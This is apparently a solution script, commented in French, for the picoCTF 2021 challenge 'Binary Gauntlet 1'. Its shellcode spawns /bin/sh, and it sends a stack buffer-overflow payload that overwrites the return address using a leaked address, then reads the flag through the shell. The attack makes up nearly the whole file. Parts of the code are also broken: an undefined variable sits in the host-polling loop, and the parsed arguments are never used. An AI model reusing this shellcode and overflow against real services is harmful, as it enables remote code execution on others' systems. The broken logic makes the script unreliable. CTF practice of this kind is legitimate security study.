# 126 - Binary Gauntlet 1  (Binary Exploitation, picoCTF 2021)
# Flag: not archived
# Write-up: ../../../writeups/binary-exploitation/126-binary-gauntlet-1.md
# Script exact utilise pour produire le flag.
#
import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

host = port = None
for _ in range(12):
    time.sleep(2)
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
# execve("/bin/sh", 0, 0) x86-64, sans 0x00 ni 0x0a

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

SC = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
print("shellcode:", len(SC), "octets | 0x0a:", b"\n" in SC, "| 0x00:", b"\x00" in SC)

for attempt in range(6):
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(6)
    leak = b""
    t0 = time.time()
    while b"\n" not in leak and time.time() - t0 < 5:
        try:
            c = s.recv(4096)
            if not c:
                break
            leak += c
        except socket.timeout:
            break
    m = re.search(rb"0x[0-9a-f]+", leak)
    if not m:
        print("pas de leak:", leak[:100])
        s.close()
        continue
    addr = int(m.group(0), 16)
    print("fuite buffer: 0x%x (essai %d)" % (addr, attempt + 1))
    payload = SC + b"\x90" * (0x70 - len(SC)) + b"B" * 8 + struct.pack("<Q", addr)
    if b"\n" in payload:
        print("  adresse contient 0x0a -> retry")
        s.close()
        continue
    s.sendall(payload + b"\n")
    time.sleep(0.4)
    s.sendall(b"cat flag.txt; ls\n")
    out = b""
    t0 = time.time()
    while time.time() - t0 < 8:
        try:
            c = s.recv(8192)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    s.close()
    txt = out.decode("latin-1", "replace")
    print("=== reponse ===")
    print(txt[:600])
    fm = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
    if fm:
        print("FLAG:", fm.group(0))
        break
    if "academy" in txt or "flag" in txt.lower():
        break
